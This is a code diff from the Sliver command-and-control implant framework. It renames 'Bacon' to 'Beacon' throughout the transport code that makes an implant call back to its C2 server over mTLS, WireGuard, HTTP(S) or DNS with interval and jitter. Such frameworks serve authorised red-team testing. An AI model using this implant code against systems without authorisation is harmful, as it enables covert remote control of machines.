@@ -18,7 +18,7 @@ package transports
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
 
-// {{if .Config.IsBacon}}
+// {{if .Config.IsBeacon}}
 
 import (
 	// {{if .Config.Debug}}
@@ -66,38 +66,38 @@ var (
 	_ url.URL
 )
 
-type BaconInit func() error
-type BaconStart func() error
-type BaconRecv func() (*pb.Envelope, error)
-type BaconSend func(*pb.Envelope) error
-type BaconClose func() error
-type BaconCleanup func() error
+type BeaconInit func() error
+type BeaconStart func() error
+type BeaconRecv func() (*pb.Envelope, error)
+type BeaconSend func(*pb.Envelope) error
+type BeaconClose func() error
+type BeaconCleanup func() error
 
-// Bacon - Abstract connection to the server
-type Bacon struct {
-	Init    BaconInit
-	Start   BaconStart
-	Send    BaconSend
-	Recv    BaconRecv
-	Close   BaconClose
-	Cleanup BaconCleanup
+// Beacon - Abstract connection to the server
+type Beacon struct {
+	Init    BeaconInit
+	Start   BeaconStart
+	Send    BeaconSend
+	Recv    BeaconRecv
+	Close   BeaconClose
+	Cleanup BeaconCleanup
 
 	ActiveC2 string
 	ProxyURL string
 }
 
-// Interval - Interval between bacons
-func (b *Bacon) Interval() int64 {
+// Interval - Interval between beacons
+func (b *Beacon) Interval() int64 {
 	return GetInterval()
 }
 
-// Jitter - Jitter between bacons
-func (b *Bacon) Jitter() int64 {
+// Jitter - Jitter between beacons
+func (b *Beacon) Jitter() int64 {
 	return GetJitter()
 }
 
 // Duration - Interval + random value <= Jitter
-func (b *Bacon) Duration() time.Duration {
+func (b *Beacon) Duration() time.Duration {
 	// {{if .Config.Debug}}
 	log.Printf("Interval: %v Jitter: %v", b.Interval(), b.Jitter())
 	// {{end}}
@@ -112,20 +112,20 @@ func (b *Bacon) Duration() time.Duration {
 	return duration
 }
 
-// StartBaconLoop - Starts the bacon loop generator
-func StartBaconLoop(abort <-chan struct{}) <-chan *Bacon {
+// StartBeaconLoop - Starts the beacon loop generator
+func StartBeaconLoop(abort <-chan struct{}) <-chan *Beacon {
 	// {{if .Config.Debug}}
-	log.Printf("Starting bacon loop ...")
+	log.Printf("Starting beacon loop ...")
 	// {{end}}
 
-	var bacon *Bacon
-	nextBacon := make(chan *Bacon)
+	var beacon *Beacon
+	nextBeacon := make(chan *Beacon)
 
 	innerAbort := make(chan struct{})
 	c2Generator := C2Generator(innerAbort)
 
 	go func() {
-		defer close(nextBacon)
+		defer close(nextBeacon)
 		defer func() {
 			innerAbort <- struct{}{}
 		}()
@@ -143,25 +143,25 @@ func StartBaconLoop(abort <-chan struct{}) <-chan *Bacon {
 			// *** MTLS ***
 			// {{if .Config.IncludeMTLS}}
 			case "mtls":
-				bacon = mtlsBacon(uri)
+				beacon = mtlsBeacon(uri)
 				// {{end}}  - IncludeMTLS
 			case "wg":
 				// *** WG ***
 				// {{if .Config.IncludeWG}}
-				bacon = wgBacon(uri)
+				beacon = wgBeacon(uri)
 				// {{end}}  - IncludeWG
 			case "https":
 				fallthrough
 			case "http":
 				// *** HTTP ***
 				// {{if .Config.IncludeHTTP}}
-				bacon = httpBacon(uri)
+				beacon = httpBeacon(uri)
 				// {{end}} - IncludeHTTP
 
 			case "dns":
 				// *** DNS ***
 				// {{if .Config.IncludeDNS}}
-				bacon = dnsBacon(uri)
+				beacon = dnsBeacon(uri)
 				// {{end}} - IncludeDNS
 
 			default:
@@ -170,20 +170,20 @@ func StartBaconLoop(abort <-chan struct{}) <-chan *Bacon {
 				// {{end}}
 			}
 			select {
-			case nextBacon <- bacon:
+			case nextBeacon <- beacon:
 			case <-abort:
 				return
 			}
 		}
 	}()
 
-	return nextBacon
+	return nextBeacon
 }
 
 // {{if .Config.IncludeMTLS}}
-func mtlsBacon(uri *url.URL) *Bacon {
+func mtlsBeacon(uri *url.URL) *Beacon {
 	// {{if .Config.Debug}}
-	log.Printf("Bacon -> %s", uri.String())
+	log.Printf("Beacon -> %s", uri.String())
 	// {{end}}
 	var err error
 	lport, err := strconv.Atoi(uri.Port())
@@ -192,7 +192,7 @@ func mtlsBacon(uri *url.URL) *Bacon {
 	}
 
 	var conn *tls.Conn
-	bacon := &Bacon{
+	beacon := &Beacon{
 		ActiveC2: uri.String(),
 		Init: func() error {
 			return nil
@@ -225,15 +225,15 @@ func mtlsBacon(uri *url.URL) *Bacon {
 		},
 	}
 
-	return bacon
+	return beacon
 }
 
 // {{end}}
 
 // {{if .Config.IncludeWG}}
-func wgBacon(uri *url.URL) *Bacon {
+func wgBeacon(uri *url.URL) *Beacon {
 	// {{if .Config.Debug}}
-	log.Printf("Establishing Bacon -> %s", uri.String())
+	log.Printf("Establishing Beacon -> %s", uri.String())
 	// {{end}}
 	lport, err := strconv.Atoi(uri.Port())
 	if err != nil {
@@ -242,7 +242,7 @@ func wgBacon(uri *url.URL) *Bacon {
 
 	var conn net.Conn
 	var dev *device.Device
-	bacon := &Bacon{
+	beacon := &Beacon{
 		ActiveC2: uri.String(),
 		Init: func() error {
 			return nil
@@ -285,29 +285,29 @@ func wgBacon(uri *url.URL) *Bacon {
 			return nil
 		},
 	}
-	return bacon
+	return beacon
 }
 
 // {{end}}
 
 // {{if .Config.IncludeHTTP}}
-func httpBacon(uri *url.URL) *Bacon {
+func httpBeacon(uri *url.URL) *Beacon {
 
 	// {{if .Config.Debug}}
-	log.Printf("Baconing -> %s", uri)
+	log.Printf("Beaconing -> %s", uri)
 	// {{end}}
 
 	var client *httpclient.SliverHTTPClient
 	var err error
 	opts := httpclient.ParseHTTPOptions(uri)
-	bacon := &Bacon{
+	beacon := &Beacon{
 		ActiveC2: uri.String(),
 		ProxyURL: opts.ProxyConfig,
 		Init: func() error {
 			client, err = httpclient.HTTPStartSession(uri.Host, uri.Path, opts)
 			if err != nil {
 				// {{if .Config.Debug}}
-				log.Printf("[bacon] http(s) connection error %s", err)
+				log.Printf("[beacon] http(s) connection error %s", err)
 				// {{end}}
 				return err
 			}
@@ -330,23 +330,23 @@ func httpBacon(uri *url.URL) *Bacon {
 		},
 	}
 
-	return bacon
+	return beacon
 }
 
 // {{end}}
 
 // {{if .Config.IncludeDNS}}
-func dnsBacon(uri *url.URL) *Bacon {
+func dnsBeacon(uri *url.URL) *Beacon {
 	var client *dnsclient.SliverDNSClient
 	var err error
-	bacon := &Bacon{
+	beacon := &Beacon{
 		ActiveC2: uri.String(),
 		Init: func() error {
 			opts := dnsclient.ParseDNSOptions(uri)
 			client, err = dnsclient.DNSStartSession(uri.Hostname(), opts)
 			if err != nil {
 				// {{if .Config.Debug}}
-				log.Printf("[bacon] dns connection error %s", err)
+				log.Printf("[beacon] dns connection error %s", err)
 				// {{end}}
 				return err
 			}
@@ -368,9 +368,9 @@ func dnsBacon(uri *url.URL) *Bacon {
 			return client.CloseSession()
 		},
 	}
-	return bacon
+	return beacon
 }
 
 // {{end}} - IncludeDNS
 
-// {{end}} - IsBacon
+// {{end}} - IsBeacon
